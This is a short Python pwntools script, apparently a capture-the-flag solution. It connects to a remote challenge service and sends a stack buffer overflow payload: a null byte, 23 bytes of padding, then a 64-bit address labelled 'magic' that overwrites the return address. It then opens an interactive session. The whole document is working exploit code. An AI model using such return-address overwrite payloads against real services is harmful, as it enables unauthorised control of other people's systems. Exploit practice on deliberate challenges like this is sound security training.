from pwn import *

r = remote('isc.taiwan-te.ch',10001)
magic = 0x4006ac

p = '\x00'
p += 'a' * 23 + p64(magic)

r.recvuntil(';)\n')

r.send(p)

r.interactive()
